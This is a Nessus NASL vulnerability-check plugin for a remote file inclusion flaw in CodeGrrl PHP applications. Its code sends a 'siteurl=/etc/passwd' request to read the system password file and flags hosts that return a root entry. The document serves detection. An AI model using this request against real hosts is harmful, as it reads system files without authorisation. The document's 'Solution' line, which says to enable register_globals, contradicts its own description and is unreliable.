#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by a
remote file inclusion vulnerability. 

Description :

The remote host appears to be running at least one of the PHP
applications from CodeGrrl - PHPCalendar, PHPClique, PHPFanBase, or
PHPQuotes.  Under certain conditions, these applications fail to
sanitize input to the 'siteurl' parameter of the 'protection.php'
script before using it in a PHP 'include' function.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
exploit this issue to view arbitrary files on the remote host and to
execute arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://www.securityfocus.com/archive/1/416525/30/30/threaded

Solution :

Enable PHP's 'register_globals' setting. 

Risk factor :

Low / CVSS Base Score : 3.5
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:C)";


if (description) {
  script_id(20214);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3571");
  script_bugtraq_id(15417);

  script_name(english:"CodeGrrl Applications Remote File Inclusion Vulnerabilities");
  script_summary(english:"Checks for remote file inclusion vulnerabilities in CodeGrrl applications");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/currently", "/calendar", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read the password file.
  req = http_get(
    item:string(
      dir, "/protection.php?",
      "action=logout&",
      "siteurl=/etc/passwd"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        res
      );
    }
    else report = desc;

    security_note(port:port, data:report);
    exit(0);
  }
}
